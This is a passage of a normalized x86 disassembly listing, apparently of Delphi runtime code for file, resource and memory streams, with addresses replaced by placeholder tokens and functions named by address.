pop ebp
retn 0x8
jmp r-xdata
sub_415b60
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403048
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
mov esp ebp
pop ebp
retn
sub_415bac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403040
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415b60
pop ecx
mov eax [ ebx ]
call sub_403084
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415b60
pop ecx
sub_415c30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415ca0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
sub_415cd8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
sub_415d10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415a94
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415dec
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415df3
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415ca0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415cd8
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415e04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416488
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4184bc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e5b
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
sub_415e64
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_415ec0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408228
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415f00
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c7c0
pop ebx
pop ebp
retn 0x8
sub_415f28
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415f6c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_415f6c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_416095
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403404
movzx edx di
mov eax esi
call sub_40814c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415e64
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4081c8
mov ecx eax
xor edx edx
mov eax ebx
call sub_415e64
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41609c
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403ed8
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408320
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ab24
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408320
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ab24
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
jmp r-xdata
sub_41609c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4160c0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
call sub_408260
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4160fc
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416134
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416158
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_416184
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41619c
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415a94
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415ca0
sub_4161d4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_4160f4
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_4161fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_4161d4
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416228
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406780
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406764
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406754
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
test ecx ecx
jne r-xdata
sub_4162b4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_4161d4
sub_416304
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404374
mov ecx eax
mov edx esi
mov eax edi
call sub_4163cc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41635c
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4163bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163c6
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_4163cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41635c
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_4160f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41635c
pop ecx
sub_416438
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406750
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_416488
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4164d0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4165d4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f08
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41662c
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fa4
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404414
mov al 0x1
inc ebx
sub_416684
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4166fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054f0
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416702
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410644
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4054f0
mov ecx eax
mov eax esi
pop edx
call sub_40ccb4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054f0
sub_416708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4167ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4167b5
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fa4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a1e4
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407ab4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4167d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413a50
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413a50
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413898
sub_416808
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413a50
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413a50
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4138e4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413898
sub_416850
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_4169e9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413df4
mov edi eax
xor edx edx
push ebp
push sub_4169ca
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169d1
mov eax [ rw-data ]
call sub_413e58
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4169ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416959
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4139f4
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413540
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416960
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410770
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4167d0
pop ecx
mov edx esi
mov eax edi
call sub_4138e4
mov eax ebx
call sub_4030f8
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416708
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416808
pop ecx
inc esi
sub_416960
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4139f4
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
sub_4169f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413df4
mov edi eax
xor eax eax
push ebp
push sub_416a93
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax edi
call sub_4139f4
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4138e4
mov eax esi
call sub_4030f8
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407ab4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416aa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413df4
mov edi eax
xor eax eax
push ebp
push sub_416b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax edi
call sub_4139f4
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4138e4
mov eax esi
call sub_4030f8
sub_416b4c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
pop ecx
pop edx
pop ebx
retn
sub_416b90
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4164d0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_416bcc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418aa4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418bb4
call sub_416b40
sub_416bf0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407ab4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403eb4
sub_416c24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407ab4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418aa4
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416ce5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_417068
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417068
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416cec
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418bb4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416b40
sub_416d14
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416d34
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404150
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403364
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
